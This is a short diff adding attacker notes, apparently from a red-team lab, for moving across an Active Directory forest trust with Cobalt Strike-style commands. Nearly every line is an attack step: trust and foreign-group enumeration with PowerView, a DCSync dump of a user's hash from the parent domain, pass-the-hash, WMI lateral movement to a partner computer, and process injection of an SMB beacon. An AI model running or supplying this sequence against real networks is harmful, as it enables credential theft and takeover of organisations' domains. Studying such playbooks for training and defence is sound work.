@@ -1,0 +1,44 @@
+powerpick Get-Domain #check forest name = PARENT_DOMAIN
+
+powerpick Get-DomainTrust 
+
+powerpick Get-DomainTrust -LDAP #Check targetname, trusttype (different trust type???)
+
+powerpick Get-ForestTrust # Check the PARTNER_DOMAIN and PARENT_DOMAIN
+
+powerpick Get-DomainComputer -Domain PARTNER_DOMAIN -Ping -Properties dnshostname # Check PARTNER_DOMAIN computers
+
+powerpick Get-DomainController -Domain PARTNER_DOMAIN
+
+powerpick Get-NetLocalGroupMember #DC_PARTNER_DOMAIN #Get the NAME associate with the Domain computer
+
+powerpick Get-NetLocalGroupMember PARTNER_COMPUTER
+
+powerpick Get-DomainForeignGroupMember -Domain PARTNER_DOMAIN
+
+powerpick "$MEMBER_NAME_From_query_domain_foreign_group_member(SID)" | ConvertFrom-SID
+
+dcsync PARENT_DOMAIN "user_from_command_line_19"  
+#Check the View > Credentials for the hash of the user above
+
+pth user ntlm_hash
+wmi to PARTNER_COMPUTER
+
+#This attack worked because of SeDebugPrivilege is disable####
+
+powerpick Get-DomainGroupMember "Domain Admins" -Domain PARTNER_DOMAIN
+
+inject PID x64 smb
+
+link PARTNER_Computer
+
+
+
+
+
+
+
+
+
+
+
